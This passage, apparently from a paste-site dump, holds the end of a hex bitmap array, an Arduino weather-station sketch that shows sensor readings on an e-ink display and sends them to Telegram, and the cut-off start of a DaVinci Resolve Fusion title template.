0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,};
"
hCc7bdWQ,Stazione Meteo Arduino V1.0,overvolt,C++,Tuesday 23rd of April 2024 10:45:21 AM CDT,"
// E-INK
#include <GxEPD.h>
#include <GxIO/GxIO_SPI/GxIO_SPI.h>
#include <GxIO/GxIO.h>
#include <GxGDEH0154D67/GxGDEH0154D67.h>

#include ""bitmap.h""

#include <Fonts/FreeSansBold18pt7b.h>     //FONT SANS BOL 18P
#include <Fonts/FreeSansBold24pt7b.h>     //FONT SANS BOL 24P

GxIO_Class io(SPI, 10, 9, 8);   // CREO SERIALE PER E-INK -- CS DC RST
GxEPD_Class display(io, 8, 7);  // CREO DISPLAY PER E-INK -- Seriale RST BUSY


// WIFI E TELEGRAM
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <UniversalTelegramBot.h>

const char* ssid = ""arduinooo"";
const char* password = ""arduinami"";

#define BOTToken ""xxxxx""
#define CHAT_ID ""xxxxx""

WiFiClientSecure client;
UniversalTelegramBot bot(BOTToken, client);


// SENSORI
#include ""DHT.h""
#include ""MQ135.h""

MQ135 mq135_sensor(A1);
DHT dht(2, DHT11);

float t, h, PPM;



void setup() {
  Serial.begin(115200);
  display.init();
  display.setRotation(2);

  dht.begin();

  WiFi.mode(WIFI_STA);

  splash();
}


void loop() {
  lettura_sensori();
  stampa_valori();
  messaggio();
  delay(3600000);
}


void splash() {
  display.eraseDisplay();                                       //SVUOTO DISPLAY
  display.drawExampleBitmap(logo, 0, 0, 200, 200, GxEPD_BLACK); //SETTO IL LOGO 
  display.update();                                             //STAMPO
  delay(3000);                                                  //ASPETTO 3 SEC

  display.drawExampleBitmap(gui, 0, 0, 200, 200, GxEPD_BLACK);
  display.update();                                             //STAMPO
}


void lettura_sensori() {
  t = dht.readTemperature();
  h = dht.readHumidity();
  PPM = mq135_sensor.getCorrectedPPM(t, h);
}


void stampa_valori() {
  display.setRotation(3);
  display.fillRect(65,0,135,200, GxEPD_WHITE);

  display.setFont(&FreeSansBold24pt7b);
  display.setTextColor(GxEPD_BLACK);

  display.setCursor(65,50);
  display.print(String(t,1));

  display.setCursor(65,115);
  display.print(String(h,0) + ""%"");

  display.setCursor(65,180);
  if (PPM > 100000) display.setFont(&FreeSansBold18pt7b);
  display.print(String(PPM,0));

  display.update();
}


void messaggio() {
  WiFi.begin(ssid, password);
  client.setCACert(TELEGRAM_CERTIFICATE_ROOT);

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(""."");
  }
  Serial.println("""");
  Serial.println(""WiFi connesso"");

  bot.sendMessage(CHAT_ID, ""\xf0\x9f\x8c\xa1 "" + String(t,1) + ""¬∞C \n \xf0\x9f\x92\xa7 "" + String(h,0) + ""% \n \xf0\x9f\x92\xa8 "" + String(PPM,0) + "" PPM"");  //invia il messaggio
  
  WiFi.disconnect(true);
  WiFi.mode(WIFI_OFF);
}
"
sxy7Erbw,Brackets,marcusa3000,Lua,Tuesday 23rd of April 2024 10:43:02 AM CDT,"{
	Tools = ordered() {
		DarkBoxText = GroupOperator {
			CtrlWZoom = false,
			CustomData = {
				Path = {
					Map = {
						[""Setting:""] = ""/Applications/DaVinci Resolve Studio.app/Contents/Resources/Fusion/Templates/Templates.drfx/Edit/Titles/""
					}
				},
			},
			Inputs = ordered() {
				Input6 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""StyledText"",
				},
				Input7 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Font"",
					ControlGroup = 4,
				},
				Input8 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Style"",
					ControlGroup = 4,
				},
				Input9 = InstanceInput {
					SourceOp = ""Text"",
					Source = ""Red1Clone"",
					Name = ""Color"",
					ControlGroup = 5,
					Default = 1,
				},
				Input10 = InstanceInput {
					SourceOp = ""Text"",
